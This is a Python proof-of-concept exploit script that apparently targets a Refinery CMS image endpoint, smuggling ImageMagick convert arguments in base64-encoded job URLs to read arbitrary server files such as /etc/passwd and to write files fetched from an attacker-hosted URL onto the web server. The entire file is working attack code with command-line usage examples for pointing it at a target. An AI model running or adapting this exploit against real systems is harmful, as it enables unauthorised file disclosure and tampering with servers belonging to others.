import requests
import argparse
import base64
import os

def arb_read(url, filename):
    payload = f'[["g", "convert", "-size 1x1 -depth 8 gray:{filename}", "out"]]'
    r = requests.get(url + '/' + base64.b64encode(payload.encode()).decode())
    if r.status_code == 200:
        print(r.text)
    else:
        print("something went wrong")

def arb_write(url, filename, target_file, local_url):
    # writes the specified file to the specified location of the web server
    size = os.path.getsize(filename)
    os.system(f"convert -size {size}x1 -depth 8 gray:{filename} out.bmp")
    print("=======================\nTo write the file:")
    print("1. Serve this file on your web server: out.bmp")
    print("2. Issue the following request")
    payload = f'[["g", "convert", "{local_url}/out.bmp -write gray:{target_file}", "png"]]'
    print(f"\t curl {url}" + base64.b64encode(payload.encode()).decode())

def main():
    parser = argparse.ArgumentParser(description="""
        python3 poc.py -u https://<target_url>/system/refinery/images -r /etc/passwd
        python3 poc.py -u https://<target_url>/system/refinery/images -w public/test.txt -c test.txt -lu http://<local_url>
    """, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-u", "--url", type=str, help='target url', nargs='?')
    parser.add_argument("-r", "--read", type=str, help='the remote file to read', nargs='?')
    parser.add_argument("-w", "--write", type=str, help='the remote file to write', nargs='?')
    parser.add_argument("-c", "--content", type=str, help="the file with the content to write", nargs='?')
    parser.add_argument("-lu", "--local-url", type=str, help='URL to the local server to host the bmp file', nargs='?')

    args = parser.parse_args()
    if not args.url:
        url = args.url
        print("Please specify the target URL")
        parser.print_help()
        return
    if args.read:
        arb_read(args.url, args.read)
    elif args.write:
        if args.content and args.local_url:
            arb_write(args.url, args.content, args.write, args.local_url)
        else:
            print("Please specify the target directory you want to write to")
    else:
        parser.print_help()
if __name__ == "__main__":
    main()
